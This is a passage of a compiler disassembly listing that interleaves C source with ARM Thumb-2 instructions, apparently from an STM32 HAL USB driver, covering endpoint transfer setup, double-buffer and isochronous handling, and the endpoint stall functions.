 8007f88:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007f8c:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f90:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007f94:	2b00      	cmp	r3, #0
 8007f96:	d005      	beq.n	8007fa4 <USB_EPStartXfer+0x12ea>
 8007f98:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f9c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007fa0:	2b00      	cmp	r3, #0
 8007fa2:	d10d      	bne.n	8007fc0 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007fa4:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007fa8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007fac:	2b00      	cmp	r3, #0
 8007fae:	f040 81f5 	bne.w	800839c <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007fb2:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007fb6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007fba:	2b00      	cmp	r3, #0
 8007fbc:	f040 81ee 	bne.w	800839c <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007fc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fc4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fc8:	681a      	ldr	r2, [r3, #0]
 8007fca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fd2:	681b      	ldr	r3, [r3, #0]
 8007fd4:	781b      	ldrb	r3, [r3, #0]
 8007fd6:	009b      	lsls	r3, r3, #2
 8007fd8:	4413      	add	r3, r2
 8007fda:	881b      	ldrh	r3, [r3, #0]
 8007fdc:	b29b      	uxth	r3, r3
 8007fde:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007fe2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007fe6:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007fea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fee:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ff2:	681a      	ldr	r2, [r3, #0]
 8007ff4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ff8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ffc:	681b      	ldr	r3, [r3, #0]
 8007ffe:	781b      	ldrb	r3, [r3, #0]
 8008000:	009b      	lsls	r3, r3, #2
 8008002:	441a      	add	r2, r3
 8008004:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8008008:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800800c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008010:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008014:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8008018:	b29b      	uxth	r3, r3
 800801a:	8013      	strh	r3, [r2, #0]
 800801c:	e1be      	b.n	800839c <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 800801e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008022:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008026:	681b      	ldr	r3, [r3, #0]
 8008028:	78db      	ldrb	r3, [r3, #3]
 800802a:	2b01      	cmp	r3, #1
 800802c:	f040 81b4 	bne.w	8008398 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8008030:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008034:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008038:	681b      	ldr	r3, [r3, #0]
 800803a:	699a      	ldr	r2, [r3, #24]
 800803c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008040:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008044:	681b      	ldr	r3, [r3, #0]
 8008046:	691b      	ldr	r3, [r3, #16]
 8008048:	429a      	cmp	r2, r3
 800804a:	d917      	bls.n	800807c <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 800804c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008050:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008054:	681b      	ldr	r3, [r3, #0]
 8008056:	691b      	ldr	r3, [r3, #16]
 8008058:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 800805c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008060:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008064:	681b      	ldr	r3, [r3, #0]
 8008066:	699a      	ldr	r2, [r3, #24]
 8008068:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800806c:	1ad2      	subs	r2, r2, r3
 800806e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008072:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008076:	681b      	ldr	r3, [r3, #0]
 8008078:	619a      	str	r2, [r3, #24]
 800807a:	e00e      	b.n	800809a <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 800807c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008080:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008084:	681b      	ldr	r3, [r3, #0]
 8008086:	699b      	ldr	r3, [r3, #24]
 8008088:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 800808c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008090:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008094:	681b      	ldr	r3, [r3, #0]
 8008096:	2200      	movs	r2, #0
 8008098:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 800809a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800809e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080a2:	681b      	ldr	r3, [r3, #0]
 80080a4:	785b      	ldrb	r3, [r3, #1]
 80080a6:	2b00      	cmp	r3, #0
 80080a8:	f040 8085 	bne.w	80081b6 <USB_EPStartXfer+0x14fc>
 80080ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080b0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080b4:	681b      	ldr	r3, [r3, #0]
 80080b6:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 80080ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080be:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080c2:	681b      	ldr	r3, [r3, #0]
 80080c4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80080c8:	b29b      	uxth	r3, r3
 80080ca:	461a      	mov	r2, r3
 80080cc:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 80080d0:	4413      	add	r3, r2
 80080d2:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 80080d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080de:	681b      	ldr	r3, [r3, #0]
 80080e0:	781b      	ldrb	r3, [r3, #0]
 80080e2:	00da      	lsls	r2, r3, #3
 80080e4:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 80080e8:	4413      	add	r3, r2
 80080ea:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80080ee:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 80080f2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080f6:	881b      	ldrh	r3, [r3, #0]
 80080f8:	b29b      	uxth	r3, r3
 80080fa:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80080fe:	b29a      	uxth	r2, r3
 8008100:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008104:	801a      	strh	r2, [r3, #0]
 8008106:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800810a:	2b3e      	cmp	r3, #62	; 0x3e
 800810c:	d923      	bls.n	8008156 <USB_EPStartXfer+0x149c>
 800810e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008112:	095b      	lsrs	r3, r3, #5
 8008114:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008118:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800811c:	f003 031f 	and.w	r3, r3, #31
 8008120:	2b00      	cmp	r3, #0
 8008122:	d104      	bne.n	800812e <USB_EPStartXfer+0x1474>
 8008124:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8008128:	3b01      	subs	r3, #1
 800812a:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 800812e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008132:	881b      	ldrh	r3, [r3, #0]
 8008134:	b29a      	uxth	r2, r3
 8008136:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 800813a:	b29b      	uxth	r3, r3
 800813c:	029b      	lsls	r3, r3, #10
 800813e:	b29b      	uxth	r3, r3
 8008140:	4313      	orrs	r3, r2
 8008142:	b29b      	uxth	r3, r3
 8008144:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008148:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800814c:	b29a      	uxth	r2, r3
 800814e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008152:	801a      	strh	r2, [r3, #0]
 8008154:	e060      	b.n	8008218 <USB_EPStartXfer+0x155e>
 8008156:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800815a:	2b00      	cmp	r3, #0
 800815c:	d10c      	bne.n	8008178 <USB_EPStartXfer+0x14be>
 800815e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008162:	881b      	ldrh	r3, [r3, #0]
 8008164:	b29b      	uxth	r3, r3
 8008166:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800816a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800816e:	b29a      	uxth	r2, r3
 8008170:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008174:	801a      	strh	r2, [r3, #0]
 8008176:	e04f      	b.n	8008218 <USB_EPStartXfer+0x155e>
 8008178:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800817c:	085b      	lsrs	r3, r3, #1
 800817e:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008182:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008186:	f003 0301 	and.w	r3, r3, #1
 800818a:	2b00      	cmp	r3, #0
 800818c:	d004      	beq.n	8008198 <USB_EPStartXfer+0x14de>
 800818e:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8008192:	3301      	adds	r3, #1
 8008194:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008198:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800819c:	881b      	ldrh	r3, [r3, #0]
 800819e:	b29a      	uxth	r2, r3
 80081a0:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80081a4:	b29b      	uxth	r3, r3
 80081a6:	029b      	lsls	r3, r3, #10
 80081a8:	b29b      	uxth	r3, r3
 80081aa:	4313      	orrs	r3, r2
 80081ac:	b29a      	uxth	r2, r3
 80081ae:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80081b2:	801a      	strh	r2, [r3, #0]
 80081b4:	e030      	b.n	8008218 <USB_EPStartXfer+0x155e>
 80081b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081be:	681b      	ldr	r3, [r3, #0]
 80081c0:	785b      	ldrb	r3, [r3, #1]
 80081c2:	2b01      	cmp	r3, #1
 80081c4:	d128      	bne.n	8008218 <USB_EPStartXfer+0x155e>
 80081c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081ca:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081ce:	681b      	ldr	r3, [r3, #0]
 80081d0:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 80081d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081d8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081dc:	681b      	ldr	r3, [r3, #0]
 80081de:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80081e2:	b29b      	uxth	r3, r3
 80081e4:	461a      	mov	r2, r3
 80081e6:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 80081ea:	4413      	add	r3, r2
 80081ec:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 80081f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081f4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081f8:	681b      	ldr	r3, [r3, #0]
 80081fa:	781b      	ldrb	r3, [r3, #0]
 80081fc:	00da      	lsls	r2, r3, #3
 80081fe:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8008202:	4413      	add	r3, r2
 8008204:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8008208:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 800820c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008210:	b29a      	uxth	r2, r3
 8008212:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8008216:	801a      	strh	r2, [r3, #0]
 8008218:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800821c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008220:	681b      	ldr	r3, [r3, #0]
 8008222:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8008226:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800822a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800822e:	681b      	ldr	r3, [r3, #0]
 8008230:	785b      	ldrb	r3, [r3, #1]
 8008232:	2b00      	cmp	r3, #0
 8008234:	f040 8085 	bne.w	8008342 <USB_EPStartXfer+0x1688>
 8008238:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800823c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008240:	681b      	ldr	r3, [r3, #0]
 8008242:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008246:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800824a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800824e:	681b      	ldr	r3, [r3, #0]
 8008250:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008254:	b29b      	uxth	r3, r3
 8008256:	461a      	mov	r2, r3
 8008258:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 800825c:	4413      	add	r3, r2
 800825e:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008262:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008266:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800826a:	681b      	ldr	r3, [r3, #0]
 800826c:	781b      	ldrb	r3, [r3, #0]
 800826e:	00da      	lsls	r2, r3, #3
 8008270:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008274:	4413      	add	r3, r2
 8008276:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800827a:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 800827e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008282:	881b      	ldrh	r3, [r3, #0]
 8008284:	b29b      	uxth	r3, r3
 8008286:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800828a:	b29a      	uxth	r2, r3
 800828c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008290:	801a      	strh	r2, [r3, #0]
 8008292:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008296:	2b3e      	cmp	r3, #62	; 0x3e
 8008298:	d923      	bls.n	80082e2 <USB_EPStartXfer+0x1628>
 800829a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800829e:	095b      	lsrs	r3, r3, #5
 80082a0:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80082a4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082a8:	f003 031f 	and.w	r3, r3, #31
 80082ac:	2b00      	cmp	r3, #0
 80082ae:	d104      	bne.n	80082ba <USB_EPStartXfer+0x1600>
 80082b0:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80082b4:	3b01      	subs	r3, #1
 80082b6:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80082ba:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082be:	881b      	ldrh	r3, [r3, #0]
 80082c0:	b29a      	uxth	r2, r3
 80082c2:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80082c6:	b29b      	uxth	r3, r3
 80082c8:	029b      	lsls	r3, r3, #10
 80082ca:	b29b      	uxth	r3, r3
 80082cc:	4313      	orrs	r3, r2
 80082ce:	b29b      	uxth	r3, r3
 80082d0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80082d4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80082d8:	b29a      	uxth	r2, r3
 80082da:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082de:	801a      	strh	r2, [r3, #0]
 80082e0:	e05c      	b.n	800839c <USB_EPStartXfer+0x16e2>
 80082e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082e6:	2b00      	cmp	r3, #0
 80082e8:	d10c      	bne.n	8008304 <USB_EPStartXfer+0x164a>
 80082ea:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082ee:	881b      	ldrh	r3, [r3, #0]
 80082f0:	b29b      	uxth	r3, r3
 80082f2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80082f6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80082fa:	b29a      	uxth	r2, r3
 80082fc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008300:	801a      	strh	r2, [r3, #0]
 8008302:	e04b      	b.n	800839c <USB_EPStartXfer+0x16e2>
 8008304:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008308:	085b      	lsrs	r3, r3, #1
 800830a:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800830e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008312:	f003 0301 	and.w	r3, r3, #1
 8008316:	2b00      	cmp	r3, #0
 8008318:	d004      	beq.n	8008324 <USB_EPStartXfer+0x166a>
 800831a:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800831e:	3301      	adds	r3, #1
 8008320:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008324:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008328:	881b      	ldrh	r3, [r3, #0]
 800832a:	b29a      	uxth	r2, r3
 800832c:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008330:	b29b      	uxth	r3, r3
 8008332:	029b      	lsls	r3, r3, #10
 8008334:	b29b      	uxth	r3, r3
 8008336:	4313      	orrs	r3, r2
 8008338:	b29a      	uxth	r2, r3
 800833a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800833e:	801a      	strh	r2, [r3, #0]
 8008340:	e02c      	b.n	800839c <USB_EPStartXfer+0x16e2>
 8008342:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008346:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800834a:	681b      	ldr	r3, [r3, #0]
 800834c:	785b      	ldrb	r3, [r3, #1]
 800834e:	2b01      	cmp	r3, #1
 8008350:	d124      	bne.n	800839c <USB_EPStartXfer+0x16e2>
 8008352:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008356:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800835a:	681b      	ldr	r3, [r3, #0]
 800835c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008360:	b29b      	uxth	r3, r3
 8008362:	461a      	mov	r2, r3
 8008364:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008368:	4413      	add	r3, r2
 800836a:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800836e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008372:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008376:	681b      	ldr	r3, [r3, #0]
 8008378:	781b      	ldrb	r3, [r3, #0]
 800837a:	00da      	lsls	r2, r3, #3
 800837c:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008380:	4413      	add	r3, r2
 8008382:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008386:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 800838a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800838e:	b29a      	uxth	r2, r3
 8008390:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008394:	801a      	strh	r2, [r3, #0]
 8008396:	e001      	b.n	800839c <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008398:	2301      	movs	r3, #1
 800839a:	e03a      	b.n	8008412 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800839c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80083a0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80083a4:	681a      	ldr	r2, [r3, #0]
 80083a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80083aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80083ae:	681b      	ldr	r3, [r3, #0]
 80083b0:	781b      	ldrb	r3, [r3, #0]
 80083b2:	009b      	lsls	r3, r3, #2
 80083b4:	4413      	add	r3, r2
 80083b6:	881b      	ldrh	r3, [r3, #0]
 80083b8:	b29b      	uxth	r3, r3
 80083ba:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80083be:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80083c2:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80083c6:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80083ca:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80083ce:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80083d2:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80083d6:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80083da:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80083de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80083e2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80083e6:	681a      	ldr	r2, [r3, #0]
 80083e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80083ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80083f0:	681b      	ldr	r3, [r3, #0]
 80083f2:	781b      	ldrb	r3, [r3, #0]
 80083f4:	009b      	lsls	r3, r3, #2
 80083f6:	441a      	add	r2, r3
 80083f8:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80083fc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008400:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008404:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008408:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800840c:	b29b      	uxth	r3, r3
 800840e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008410:	2300      	movs	r3, #0
}
 8008412:	4618      	mov	r0, r3
 8008414:	f507 7784 	add.w	r7, r7, #264	; 0x108
 8008418:	46bd      	mov	sp, r7
 800841a:	bd80      	pop	{r7, pc}

0800841c <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800841c:	b480      	push	{r7}
 800841e:	b085      	sub	sp, #20
 8008420:	af00      	add	r7, sp, #0
 8008422:	6078      	str	r0, [r7, #4]
 8008424:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 8008426:	683b      	ldr	r3, [r7, #0]
 8008428:	785b      	ldrb	r3, [r3, #1]
 800842a:	2b00      	cmp	r3, #0
 800842c:	d020      	beq.n	8008470 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 800842e:	687a      	ldr	r2, [r7, #4]
 8008430:	683b      	ldr	r3, [r7, #0]
 8008432:	781b      	ldrb	r3, [r3, #0]
 8008434:	009b      	lsls	r3, r3, #2
 8008436:	4413      	add	r3, r2
 8008438:	881b      	ldrh	r3, [r3, #0]
 800843a:	b29b      	uxth	r3, r3
 800843c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008440:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008444:	81bb      	strh	r3, [r7, #12]
 8008446:	89bb      	ldrh	r3, [r7, #12]
 8008448:	f083 0310 	eor.w	r3, r3, #16
 800844c:	81bb      	strh	r3, [r7, #12]
 800844e:	687a      	ldr	r2, [r7, #4]
 8008450:	683b      	ldr	r3, [r7, #0]
 8008452:	781b      	ldrb	r3, [r3, #0]
 8008454:	009b      	lsls	r3, r3, #2
 8008456:	441a      	add	r2, r3
 8008458:	89bb      	ldrh	r3, [r7, #12]
 800845a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800845e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008462:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008466:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800846a:	b29b      	uxth	r3, r3
 800846c:	8013      	strh	r3, [r2, #0]
 800846e:	e01f      	b.n	80084b0 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 8008470:	687a      	ldr	r2, [r7, #4]
 8008472:	683b      	ldr	r3, [r7, #0]
 8008474:	781b      	ldrb	r3, [r3, #0]
 8008476:	009b      	lsls	r3, r3, #2
 8008478:	4413      	add	r3, r2
 800847a:	881b      	ldrh	r3, [r3, #0]
 800847c:	b29b      	uxth	r3, r3
 800847e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008482:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008486:	81fb      	strh	r3, [r7, #14]
 8008488:	89fb      	ldrh	r3, [r7, #14]
 800848a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800848e:	81fb      	strh	r3, [r7, #14]
 8008490:	687a      	ldr	r2, [r7, #4]
 8008492:	683b      	ldr	r3, [r7, #0]
 8008494:	781b      	ldrb	r3, [r3, #0]
 8008496:	009b      	lsls	r3, r3, #2
 8008498:	441a      	add	r2, r3
 800849a:	89fb      	ldrh	r3, [r7, #14]
 800849c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80084a0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80084a4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80084a8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80084ac:	b29b      	uxth	r3, r3
 80084ae:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80084b0:	2300      	movs	r3, #0
}
 80084b2:	4618      	mov	r0, r3
 80084b4:	3714      	adds	r7, #20
 80084b6:	46bd      	mov	sp, r7
 80084b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084bc:	4770      	bx	lr

080084be <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80084be:	b480      	push	{r7}
 80084c0:	b087      	sub	sp, #28
 80084c2:	af00      	add	r7, sp, #0
 80084c4:	6078      	str	r0, [r7, #4]
 80084c6:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80084c8:	683b      	ldr	r3, [r7, #0]
 80084ca:	7b1b      	ldrb	r3, [r3, #12]
 80084cc:	2b00      	cmp	r3, #0
 80084ce:	f040 809d 	bne.w	800860c <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 80084d2:	683b      	ldr	r3, [r7, #0]
 80084d4:	785b      	ldrb	r3, [r3, #1]
 80084d6:	2b00      	cmp	r3, #0
